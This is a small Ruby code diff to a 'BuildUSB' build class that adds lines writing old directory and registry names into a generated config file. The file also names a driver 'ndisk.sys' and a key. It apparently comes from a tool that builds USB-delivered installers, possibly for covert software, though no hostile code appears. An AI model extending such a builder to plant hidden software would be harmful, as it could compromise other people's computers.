@@ -74,6 +74,8 @@ class BuildUSB < Build
 
       f.puts "HDIR=#{names[:dir]}"
       f.puts "HREG=#{names[:reg]}"
+      f.puts "HOLDDIR=#{names[:olddir]}"
+      f.puts "HOLDREG=#{names[:oldreg]}"
       f.puts "HSYS=ndisk.sys"
       f.puts "HKEY=#{key}"
       f.puts "FUNC=" + funcname
